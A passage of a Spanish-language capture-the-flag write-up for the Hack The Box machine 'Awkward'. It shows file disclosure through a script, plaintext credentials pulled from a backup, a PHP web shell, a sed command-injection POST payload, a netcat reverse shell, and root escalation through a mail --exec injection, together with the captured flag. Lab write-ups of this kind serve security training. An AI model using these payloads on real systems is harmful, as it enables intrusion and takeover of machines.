# set a fancy prompt (non-color, unless we know we "want" color)
case "$TERM" in
    xterm-color|*-256color) color_prompt=yes;;
esac

# uncomment for a colored prompt, if the terminal has the capability; turned
# off by default to not distract the user: the focus in a terminal window
# should be on the output of commands, not on the prompt
#force_color_prompt=yes

if [ -n "$force_color_prompt" ]; then
    if [ -x /usr/bin/tput ] && tput setaf 1 >&/dev/null; then
	# We have color support; assume it's compliant with Ecma-48
	# (ISO/IEC-6429). (Lack of such support is extremely rare, and such
	# a case would tend to support setf rather than setaf.)
	color_prompt=yes
    else
	color_prompt=
    fi
fi

if [ "$color_prompt" = yes ]; then
    PS1='${debian_chroot:+($debian_chroot)}\[\033[01;32m\]\u@\h\[\033[00m\]:\[\033[01;34m\]\w\[\033[00m\]\$ '
else
    PS1='${debian_chroot:+($debian_chroot)}\u@\h:\w\$ '
fi
unset color_prompt force_color_prompt

# If this is an xterm set the title to user@host:dir
case "$TERM" in
xterm*|rxvt*)
    PS1="\[\e]0;${debian_chroot:+($debian_chroot)}\u@\h: \w\a\]$PS1"
    ;;
*)
    ;;
esac

# enable color support of ls and also add handy aliases
if [ -x /usr/bin/dircolors ]; then
    test -r ~/.dircolors && eval "$(dircolors -b ~/.dircolors)" || eval "$(dircolors -b)"
    alias ls='ls --color=auto'
    #alias dir='dir --color=auto'
    #alias vdir='vdir --color=auto'

    alias grep='grep --color=auto'
    alias fgrep='fgrep --color=auto'
    alias egrep='egrep --color=auto'
fi

# colored GCC warnings and errors
#export GCC_COLORS='error=01;31:warning=01;35:note=01;36:caret=01;32:locus=01:quote=01'

# some more ls aliases
alias ll='ls -alF'
alias la='ls -A'
alias l='ls -CF'

# custom
alias backup_home='/bin/bash /home/bean/Documents/backup_home.sh'

# Add an "alert" alias for long running commands.  Use like so:
#   sleep 10; alert
alias alert='notify-send --urgency=low -i "$([ $? = 0 ] && echo terminal || echo error)" "$(history|tail -n1|sed -e '\''s/^\s*[0-9]\+\s*//;s/[;&|]\s*alert$//'\'')"'

# Alias definitions.
# You may want to put all your additions into a separate file like
# ~/.bash_aliases, instead of adding them here directly.
# See /usr/share/doc/bash-doc/examples in the bash-doc package.

if [ -f ~/.bash_aliases ]; then
    . ~/.bash_aliases
fi

# enable programmable completion features (you don't need to enable
# this, if it's already enabled in /etc/bash.bashrc and /etc/profile
# sources /etc/bash.bashrc).
if ! shopt -oq posix; then
  if [ -f /usr/share/bash-completion/bash_completion ]; then
    . /usr/share/bash-completion/bash_completion
  elif [ -f /etc/bash_completion ]; then
    . /etc/bash_completion
  fi
fi
```

```null
python3 lfi.py /home/bean/Documents/backup_home.sh
#!/bin/bash
mkdir /home/bean/Documents/backup_tmp
cd /home/bean
tar --exclude='.npm' --exclude='.cache' --exclude='.vscode' -czvf /home/bean/Documents/backup_tmp/bean_backup.tar.gz .
date > /home/bean/Documents/backup_tmp/time.txt
cd /home/bean/Documents/backup_tmp
tar -czvf /home/bean/Documents/backup/bean_backup_final.tar.gz .
rm -r /home/bean/Documents/backup_tmp
```

Puedo ver su contenido

```null
python3 lfi.py /home/bean/Documents/backup_home.sh
#!/bin/bash
mkdir /home/bean/Documents/backup_tmp
cd /home/bean
tar --exclude='.npm' --exclude='.cache' --exclude='.vscode' -czvf /home/bean/Documents/backup_tmp/bean_backup.tar.gz .
date > /home/bean/Documents/backup_tmp/time.txt
cd /home/bean/Documents/backup_tmp
tar -czvf /home/bean/Documents/backup/bean_backup_final.tar.gz .
rm -r /home/bean/Documents/backup_tmp
```

Se está creando un comprimido de todo lo que hay en el directorio personal del usuario ```bean```. Me lo traigo y lo almaceno en un archivo

```null
python3 lfi.py /home/bean/Documents/backup/bean_backup_final.tar.gz > file.tar.gz
```

Pero así se corrompe

```null
tar -xf file.tar.gz

gzip: stdin: not in gzip format
tar: Child returned status 1
tar: Error is not recoverable: exiting now
```

Para solucionarlo, basta con cambiar ```r.text``` por

```null
with open("file.tar.gz", "wb") as f:
f.write(r.content)
```
en el script de python 

```null
python3 lfi.py /home/bean/Documents/backup/bean_backup_final.tar.gz
```

En ```.config/xpad``` hay un archivo con credenciales en texto claro

```null
cat content-DS1ZS1
TO DO:
- Get real hat prices / stock from Christine
- Implement more secure hashing mechanism for HR system
- Setup better confirmation message when adding item to cart
- Add support for item quantity > 1
- Implement checkout system

boldHR SYSTEM/bold
bean.hill
014mrbeanrules!#P

https://www.slac.stanford.edu/slac/www/resource/how-to-use/cgi-rexx/cgi-esc.html

boldMAKE SURE TO USE THIS EVERYWHERE ^^^/bold# 
```

Gano acceso al sistema

```null
ssh bean@10.10.11.185
bean@10.10.11.185's password: 
Welcome to Ubuntu 22.04.1 LTS (GNU/Linux 5.15.0-52-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

0 updates can be applied immediately.


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Last login: Sun Oct 23 21:38:08 2022 from 10.10.14.6
bean@awkward:~$ 
```

Puedo ver la primera flag

```null
bean@awkward:~$ cat user.txt 
c27f3e6ceab434ce99cce0eb00bfa9df
```

# Escalada

Las credenciales se reutilizan para el usuario ```admin``` en ```http://store.hat-valley.htb/```

<img src="/writeups/assets/img/Awkward-htb/9.png" alt="">

Subo el ```pspy``` para ver tareas que se están ejecutando en el sistema

```null
2023/03/24 22:07:24 CMD: UID=0    PID=909    | /bin/bash /root/scripts/notify.sh 
2023/03/24 22:07:24 CMD: UID=0    PID=908    | inotifywait --quiet --monitor --event modify /var/www/private/leave_requests.csv 
2023/03/24 22:07:24 CMD: UID=0    PID=907    | /bin/bash /root/scripts/notify.sh 
```

El usuario ```root``` está ejecutando un script de ```bash```. Listo el contenido en ```/var/www```

Tengo capacidad de escritura en dos directorios

```null
bean@awkward:/var/www$ find . -writable 2>/dev/null -ls
    17158      4 drwxrwxrwx   2 root     root         4096 Mar 24 22:10 ./store/product-details
    17102      4 drwxrwxrwx   2 root     root         4096 Oct  6 01:35 ./store/cart
```

Dentro del primero hay tres archivos TXT

```null
bean@awkward:/var/www$ cd ./store/product-details
bean@awkward:/var/www/store/product-details$ ls
1.txt  2.txt  3.txt
bean@awkward:/var/www/store/product-details$ cat *
***Hat Valley Product***
item_id=1&item_name=Yellow Beanie&item_brand=Good Doggo&item_price=$39.90
***Hat Valley Product***
item_id=2&item_name=Palm Tree Cap&item_brand=Kool Kats&item_price=$48.50
***Hat Valley Product***
item_id=3&item_name=Straw Hat&item_brand=Sunny Summer&item_price=$70.00
```

El otro está vacío

```null
bean@awkward:/var/www/store/cart$ ls -la
total 8
drwxrwxrwx 2 root root 4096 Oct  6 01:35 .
drwxr-xr-x 9 root root 4096 Oct  6 01:35 ..
```

Creo un archivo en PHP que me permita ejecutar comandos

```null
<?php
system($_REQUEST['cmd]);
?>
```

Veo el archivo de configuración del ```ngnix```

```null
bean@awkward:/var/www/store/cart$ cat /etc/nginx/sites-available/store.conf 
server {
    listen       80;
    server_name  store.hat-valley.htb;
    root /var/www/store;

    location / {
        index index.php index.html index.htm;
    }
    # pass the PHP scripts to FastCGI server listening on 127.0.0.1:9000
    #
    location ~ /cart/.*\.php$ {
	return 403;
    }
    location ~ /product-details/.*\.php$ {
	return 403;
    }
    location ~ \.php$ {
        auth_basic "Restricted";
        auth_basic_user_file /etc/nginx/conf.d/.htpasswd;
        fastcgi_pass   unix:/var/run/php/php8.1-fpm.sock;
        fastcgi_index  index.php;
        fastcgi_param  SCRIPT_FILENAME  $realpath_root$fastcgi_script_name;
        include        fastcgi_params;
    }
    # deny access to .htaccess files, if Apache's document root
    # concurs with nginx's one
    #
    #location ~ /\.ht {
    #    deny  all;
    #}
}
```

En caso de que quiera apuntar a este script directamente, situado en ```/cart```, me va a devolver un código de estado 403. Filtro por funciones ```system``` en todos los scripts

```null
bean@awkward:/var/www/store$ grep -ri "system("
cart_actions.php:            system("echo '***Hat Valley Cart***' > {$STORE_HOME}cart/{$user_id}");
cart_actions.php:        system("head -2 {$STORE_HOME}product-details/{$item_id}.txt | tail -1 >> {$STORE_HOME}cart/{$user_id}");
cart_actions.php:        system("sed -i '/item_id={$item_id}/d' {$STORE_HOME}cart/{$user_id}");
cart/test.php:system($_REQUEST['cmd']);
```

En este caso, se puede tratar de inyectar comandos en la función ```sed```. Lo primero es añadir un producto de la tienda a la cesta

<img src="/writeups/assets/img/Awkward-htb/10.png" alt="">

Intercepto con ```BurpSuite``` la petición al eliminarlo

```null
POST /cart_actions.php HTTP/1.1
Host: store.hat-valley.htb
Content-Length: 49
Authorization: Basic YWRtaW46MDE0bXJiZWFucnVsZXMhI1A=
Accept: */*
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Origin: http://store.hat-valley.htb
Referer: http://store.hat-valley.htb/cart.php
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

item=1&user=a03e-e3bf-4d6-0108&action=delete_item
```

Inyecto el comando, pero antes hay que tener en cuenta que ciertos caracteres están restringidos

```null
if ($_SERVER['REQUEST_METHOD'] === 'POST' && $_POST['action'] === 'delete_item' && $_POST['item'] && $_POST['user']) {
    $item_id = $_POST['item'];
    $user_id = $_POST['user'];
    $bad_chars = array(";","&","|",">","<","*","?","`","$","(",")","{","}","[","]","!","#"); //no hacking allowed!!
```

También hay que burlar la validación del item

```null
if(checkValidItem("{$STORE_HOME}cart/{$user_id}")) {
    system("sed -i '/item_id={$item_id}/d' {$STORE_HOME}cart/{$user_id}");
    echo "Item removed from cart";
`` 

El payload sería así:

```null
POST /cart_actions.php HTTP/1.1
Host: store.hat-valley.htb
Content-Length: 49
Authorization: Basic YWRtaW46MDE0bXJiZWFucnVsZXMhI1A=
Accept: */*
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Origin: http://store.hat-valley.htb
Referer: http://store.hat-valley.htb/cart.php
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

item=1'+-e+"1e+/tmp/test.sh"+'&user=a03e-e3bf-4d6-0108&action=delete_item
```

```null
HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Mon, 27 Mar 2023 09:59:04 GMT
Content-Type: text/html; charset=UTF-8
Connection: close
Content-Length: 22

Item removed from cart
```

Recibo el ping

```null
tcpdump -i tun0 icmp -n
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
10:05:01.867846 IP 10.10.11.185 > 10.10.16.2: ICMP echo request, id 2, seq 1, length 64
10:05:01.867906 IP 10.10.16.2 > 10.10.11.185: ICMP echo reply, id 2, seq 1, length 64
```

Me envío una reverse shell

```null
nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.16.2] from (UNKNOWN) [10.10.11.185] 36464
bash: cannot set terminal process group (1406): Inappropriate ioctl for device
bash: no job control in this shell
www-data@awkward:~/store$ script /dev/null -c bash
script /dev/null -c bash
Script started, output log file is '/dev/null'.
www-data@awkward:~/store$ ^Z
zsh: suspended  nc -nlvp 443
❯ stty raw -echo; fg
[1]  + continued  nc -nlvp 443
                              reset xterm
www-data@awkward:~/store$ export TERM=xterm
www-data@awkward:~/store$ export SHELL=bash
www-data@awkward:~/store$ stty rows 55 columns 209
```

Gano acceso como ```www-data```. Puedo leer el archivo de antes

```null
www-data@awkward:~/store$ ls -l /var/www/private/leave_requests.csv 
-rwxrwxrwx 1 christine www-data 600 Mar 27 21:30 /var/www/private/leave_requests.csv
```

```null
www-data@awkward:~/store$ cat /var/www/private/leave_requests.csv
Leave Request Database,,,,
,,,,
HR System Username,Reason,Start Date,End Date,Approved
bean.hill,Taking a holiday in Japan,23/07/2022,29/07/2022,Yes
christine.wool,Need a break from Jackson,14/03/2022,21/03/2022,Yes
jackson.lightheart,Great uncle's goldfish funeral + ceremony,10/05/2022,10/06/2022,No
jackson.lightheart,Vegemite eating competition,12/12/2022,22/12/2022,No
christopher.jones,Donating blood,19/06/2022,23/06/2022,Yes
christopher.jones,Taking a holiday in Japan with Bean,29/07/2022,6/08/2022,Yes
bean.hill,Inevitable break from Chris after Japan,14/08/2022,29/08/2022,No
```

Al añadir líneas aquí, una tarea CRON se encarga de borrarlas

```null
echo 'bean.hill,Inevitable break from Chris after Test,14/08/2022,29/08/2022,No' >> /var/www/private/leave_requests.csv; cat /var/www/private/leave_requests.csv; ./pspy 
```

```null
2023/03/27 22:10:01 CMD: UID=0    PID=3835   | /bin/bash /root/scripts/restore.sh 
2023/03/27 22:10:01 CMD: UID=0    PID=3834   | mail -s Leave Request:  christine 
2023/03/27 22:10:01 CMD: UID=0    PID=3839   | /bin/bash /root/scripts/restore.sh 
2023/03/27 22:10:01 CMD: UID=0    PID=3840   | /usr/sbin/sendmail -oi -f root@awkward -t 
2023/03/27 22:10:01 CMD: UID=0    PID=3842   | /usr/sbin/postdrop -r 
2023/03/27 22:10:01 CMD: UID=0    PID=3841   | /usr/sbin/sendmail -FCronDaemon -i -B8BITMIME -oem root 
2023/03/27 22:10:01 CMD: UID=0    PID=3843   | /usr/sbin/postdrop -r 
2023/03/27 22:10:01 CMD: UID=0    PID=3844   | cleanup -z -t unix -u -c 
2023/03/27 22:10:01 CMD: UID=0    PID=3853   | local -t unix 
2023/03/27 22:10:01 CMD: UID=0    PID=3852   | local -t unix 
2023/03/27 22:10:01 CMD: UID=0    PID=3851   | mail -s Leave Request: bean.hill christine 
2023/03/27 22:10:01 CMD: UID=128  PID=3845   | trivial-rewrite -n rewrite -t unix -u -c 
2023/03/27 22:10:01 CMD: UID=0    PID=3854   | /usr/sbin/sendmail -oi -f root@awkward -t 
2023/03/27 22:10:01 CMD: UID=0    PID=3855   | /usr/sbin/postdrop -r 
```

Se puede inyectar un comando según [GTFObins](https://gtfobins.github.io/gtfobins/mail/)

<img src="/writeups/assets/img/Awkward-htb/11.png" alt="">

Añado la siguiente línea al archivo:

```null
--exec='/tmp/test.sh'
```

Gano acceso al sistema y puedo ver la segunda flag